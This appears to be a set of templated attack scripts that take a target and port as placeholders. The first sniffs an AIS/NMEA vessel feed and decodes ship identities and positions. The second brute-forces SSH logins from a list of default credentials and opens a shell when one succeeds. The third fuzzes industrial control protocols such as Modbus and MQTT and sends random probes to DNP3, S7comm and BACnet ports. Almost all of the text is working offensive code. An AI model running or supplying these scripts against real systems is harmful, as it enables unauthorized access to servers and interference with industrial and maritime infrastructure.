import socket
import struct
import time

TARGET = '{target}'
PORT = {port}
DURATION = {duration}

AIS_TYPES = {1:'PosA',2:'PosA',3:'PosA',4:'BaseStation',5:'Static',
    8:'Binary',18:'PosB',19:'PosB_Ext',21:'AtoN',24:'StaticB'}

def decode_ais(payload_str):
    bits = ''
    for c in payload_str:
        val = ord(c) - 48
        if val > 40:
            val -= 8
        bits += format(val, '06b')
    return bits

def extract_fields(bits):
    if len(bits) < 38:
        return None
    msg_type = int(bits[0:6], 2)
    mmsi = int(bits[8:38], 2)
    result = {'type': msg_type, 'mmsi': mmsi, 'type_name': AIS_TYPES.get(msg_type, f'T{msg_type}')}
    if msg_type in (1,2,3) and len(bits) >= 168:
        lon = int(bits[61:89], 2)
        if lon >= (1 << 27): lon -= (1 << 28)
        lat = int(bits[89:116], 2)
        if lat >= (1 << 26): lat -= (1 << 27)
        sog = int(bits[46:56], 2) / 10.0
        cog = int(bits[116:128], 2) / 10.0
        result.update({'lat': lat/600000.0, 'lon': lon/600000.0, 'sog': sog, 'cog': cog})
    return result

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(DURATION + 2)
sock.connect((TARGET, PORT))
print(f'Connected to NMEA feed at {TARGET}:{PORT}')

buffer = ''
messages = []
mmsis = set()
start = time.time()
sock.settimeout(2)

while time.time() - start < DURATION:
    try:
        data = sock.recv(4096).decode(errors='replace')
        if not data: break
        buffer += data
        while '\n' in buffer:
            line, buffer = buffer.split('\n', 1)
            line = line.strip()
            if not line: continue
            messages.append(line)
            if line.startswith('!AIVD'):
                parts = line.split(',')
                if len(parts) >= 6 and parts[5]:
                    bits = decode_ais(parts[5])
                    fields = extract_fields(bits)
                    if fields:
                        mmsis.add(fields['mmsi'])
                        if 'lat' in fields:
                            print(f'  MMSI {fields["mmsi"]:09d} | {fields["type_name"]:10s} | {fields["lat"]:.4f},{fields["lon"]:.4f} | SOG={fields["sog"]:.1f}kn COG={fields["cog"]:.1f}')
                        else:
                            print(f'  MMSI {fields["mmsi"]:09d} | {fields["type_name"]}')
    except socket.timeout:
        continue

sock.close()
print(f'\nCaptured {len(messages)} sentences, {len(mmsis)} unique vessels')
if mmsis:
    print(f'MMSIs: {sorted(mmsis)[:30]}')

ssh_brute_paramiko:
import socket
import time
import sys

TARGET = '{target}'
PORT = {port}
CREDENTIALS = [
    ('root', 'root'), ('root', 'toor'), ('root', 'password'), ('root', '123456'),
    ('root', 'admin'), ('root', ''), ('admin', 'admin'), ('admin', 'password'),
    ('pi', 'raspberry'), ('test', 'test'), ('ubuntu', 'ubuntu'), ('user', 'user'),
    ('guest', 'guest'), ('operator', 'operator'), ('support', 'support'),
]

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False

def test_ssh_paramiko(host, port, username, password):
    transport = paramiko.Transport((host, port))
    try:
        transport.connect(username=username, password=password)
        try:
            session = transport.open_session()
            session.get_pty()
            session.invoke_shell()
            time.sleep(0.5)
            session.settimeout(2)
            banner = session.recv(4096).decode(errors='replace')[:200]
            session.close()
        except:
            banner = 'AUTH_OK (no shell)'
        transport.close()
        return True, banner
    except paramiko.AuthenticationException:
        return False, 'REJECTED'
    except Exception as e:
        return None, str(e)

def test_ssh_raw(host, port, username, password):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((host, port))
        banner = sock.recv(1024).decode(errors='replace').strip()
        sock.sendall(b'SSH-2.0-OpenSSH_8.9\r\n')
        kex = sock.recv(4096)
        sock.close()
        return True, f'{banner} (kex={len(kex)}B)'
    except Exception as e:
        return None, str(e)

print(f'SSH Brute Force')
print(f'Target: {TARGET}:{PORT}')
print(f'Credentials: {len(CREDENTIALS)}')
print(f'Method: {"paramiko" if HAS_PARAMIKO else "raw TCP"}\n')

accepted = []
for user, pw in CREDENTIALS:
    if HAS_PARAMIKO:
        ok, msg = test_ssh_paramiko(TARGET, PORT, user, pw)
    else:
        ok, msg = test_ssh_raw(TARGET, PORT, user, pw)
    display = pw or '(empty)'
    if ok:
        accepted.append((user, pw))
        print(f'  [+] {user}:{display} -> {msg[:80]}')
    elif ok is False:
        print(f'  [-] {user}:{display} -> {msg}')
    else:
        print(f'  [?] {user}:{display} -> {msg[:80]}')
    time.sleep(0.3)

print(f'\nResults: {len(accepted)}/{len(CREDENTIALS)} accepted')
for u, p in accepted:
    print(f'  {u}:{p or "(empty)"}')

ics_protocol_fuzzer:
import socket
import struct
import random
import time
import sys

TARGET = '{target}'
PROTOCOLS = {
    502:  'modbus',
    1883: 'mqtt',
    161:  'snmp',
    47808: 'bacnet',
    20000: 'dnp3',
    102:   's7comm',
}

def fuzz_modbus(sock):
    results = []
    # Fuzz function codes 0-127
    for fc in range(128):
        pdu = bytes([fc]) + b'\x00\x00\x00\x01'
        mbap = struct.pack('!HHHB', random.randint(0, 0xFFFF), 0, len(pdu)+1, 1)
        try:
            sock.sendall(mbap + pdu)
            resp = sock.recv(1024)
            if resp and len(resp) >= 8:
                resp_fc = resp[7]
                if not (resp_fc & 0x80):
                    results.append((fc, 'SUPPORTED', resp.hex()))
                else:
                    exc = resp[8] if len(resp) > 8 else 0
                    if exc != 1:  # Not ILLEGAL_FUNCTION
                        results.append((fc, f'EXC_{exc}', resp.hex()))
        except:
            pass
    return results

def fuzz_mqtt(sock):
    results = []
    # Test oversized packets, malformed headers, reserved types
    tests = [
        (b'\x10\x00', 'empty_connect'),
        (b'\x10\xff\xff\xff\x7f', 'max_length_connect'),
        (b'\xf0\x00', 'reserved_type_15'),
        (b'\x00\x00', 'reserved_type_0'),
        (b'\x82\x05\x00\x01\x00\x01\x23\x00', 'subscribe_wildcard_#'),
        (b'\x30' + struct.pack('B', 50) + b'\x00\x10' + b'A'*16 + b'B'*32, 'publish_test'),
    ]
    for payload, name in tests:
        try:
            sock.sendall(payload)
            time.sleep(0.2)
            resp = sock.recv(1024)
            results.append((name, len(resp), resp.hex()[:40]))
        except:
            results.append((name, 0, 'no_response'))
    return results

for port, proto in sorted(PROTOCOLS.items()):
    print(f'\n[*] Fuzzing {proto} on port {port}...')
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((TARGET, port))

        if proto == 'modbus':
            results = fuzz_modbus(sock)
            for fc, status, data in results:
                print(f'  FC 0x{fc:02x}: {status} [{data[:30]}]')
        elif proto == 'mqtt':
            results = fuzz_mqtt(sock)
            for name, rlen, data in results:
                print(f'  {name}: {rlen}B [{data}]')
        else:
            # Generic: send random data and observe response
            sock.sendall(random.randbytes(64))
            time.sleep(0.3)
            try:
                resp = sock.recv(1024)
                print(f'  Random probe: {len(resp)}B response')
            except:
                print(f'  Random probe: no response')

        sock.close()
    except socket.timeout:
        print(f'  Connection timeout')
    except ConnectionRefusedError:
        print(f'  Port closed')
    except Exception as e:
        print(f'  Error: {e}')

print(f'\nFuzzing complete')
